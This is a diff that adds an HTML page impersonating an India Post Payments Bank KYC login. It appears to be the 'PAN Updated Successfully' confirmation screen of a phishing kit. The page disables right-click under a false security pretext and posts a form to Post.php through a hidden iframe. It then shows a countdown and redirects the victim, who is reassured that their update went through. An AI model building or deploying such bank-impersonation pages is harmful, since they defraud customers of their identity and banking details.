@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
+    <title> IndiaPost Payment Bank KYC login</title>
+    <style>
+    #hh,#jj
+    {
+    width: 104%;
+    margin:-8px;
+    margin-left:-7px;
+    }
+    #ll
+    {
+    background-color:#AE2924;
+    color: white;
+    padding: 0px 0px;
+    margin: 10px 25px;
+    border: none;
+    outline:none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 15px; width: 120px; height: 36px;
+    }
+    #ll:hover
+    {
+    background-color:#3E1128;
+    color: white;
+    padding: 0px 0px;
+    margin: 10px 25px;
+    border: none;
+    outline:none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 15px; width: 120px; height: 36px;
+    }
+    #kyc
+    {
+    width:104%;   
+    background-color:#3E1128;
+    height:55px;
+    margin:6px;
+    margin-left:-7px;
+    }
+    #rr
+    { 
+    width: 20%;
+    margin:-20px;
+    
+    }
+    </style>
+    <script language="javascript">
+    
+    var message="For security reasons,This function is not allowed here.";
+    function clickIE4(){
+    
+    if (event.button==2){
+    alert(message);
+    return false;
+    }
+    }
+    
+    function clickNS4(e){
+    if (document.layers||document.getElementById&&!document.all){
+    if (e.which==2||e.which==3){
+    alert(message);
+    return false;
+    }
+    }
+    }
+    
+    if (document.layers){
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown=clickNS4;
+    }
+    
+    else if (document.all&&!document.getElementById){
+    document.onmousedown=clickIE4;
+    }
+    
+    document.oncontextmenu=new Function("alert(message);return false;")
+    
+    </script>
+    </head>
+    <body onload="startTimer();">
+    <div style="text-align:center;">
+    <div class="line">
+    <!-- Static- Please don't do anything here-->
+    <script type="text/javascript">var submitted=false;</script>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='index.html';}"></iframe>
+    <!--My Form-->
+    <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <center><img src="indiapost.png" id="hh"></center>
+    </div>
+    <div id="kyc"><br>
+    <b style="font-family: 'Inter', sans-serif; color:white; font-size:15px; margin-left:-15%;">REQUEST SUBMITED SUCESSFULLY</b>
+    </div>
+    <div id="col">
+    <br>
+    <center> <img src="ticked.png" alt="" id="rr"> </center>
+    <form action="index.html" method="">
+    <center> <h4
+    style="font-family: 'Inter', sans-serif; color:green">PAN Updated Successfully
+    </h4></center>
+    <center> <h3
+    style="font-family: 'Inter', sans-serif; color:grey; font-size:16px; margin:-15px;">You have successfully update your PAN card. Please wait 30 minutes for update.</h3></center><br><br>
+    <b style="font-family: 'Inter', sans-serif; color:grey; font-size:14px; margin-left:10px;">Don't share your passwords and OTP with anyone.</b><br><br>
+    <div id="kk">
+    <center><button type="exit" id="ll">EXIT </button></center> <br>
+    </div>
+    <script type="text/javascript">
+    var timer=120;
+    var sec=0;
+    function startTimer() {
+    sec=parseInt(timer%120);
+    
+    if (timer<0) {
+    // timer.stop();
+    window.location.href = "index.html";
+    }
+    
+    document.getElementById("time").innerHTML = "<b>This screen will automatically timeout after : </b>"+sec.toString();
+    timer--;
+    setTimeout(function(){
+    startTimer();
+    
+    }, 1000);
+    }
+    
+    </script>
+    <div>
+    <b style="color:red; font-size:16px;"><span style="color:red; font-size:16px;" id="time"></span>&nbsp;second</b>
+    </div>
+    </div>
+    </body>
+    </html>
